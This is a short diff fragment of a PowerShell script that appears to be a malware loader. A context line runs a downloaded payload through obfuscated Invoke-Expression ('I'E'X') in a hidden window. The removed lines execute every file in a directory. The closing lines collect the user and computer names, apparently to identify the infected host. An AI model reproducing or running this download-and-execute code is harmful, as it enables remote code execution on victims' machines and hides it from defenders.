@@ -77,10 +77,7 @@ Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru
 
 
 
-Get-ChildItem -Path $dir | Where-Object { $_.PSIsContainer -eq $false } | ForEach-Object {
-    Write-Output $_.FullName
-    Start-Process -FilePath $_.FullName
-}
+Start-Process -FilePath ""
 
 $u = ("u$env:username" -replace '[^a-zA-Z0-9\-]+', '')[0..63] -join ''
 $c = ("c$env:computername" -replace '[^a-zA-Z0-9\-]+', '')[0..63] -join ''
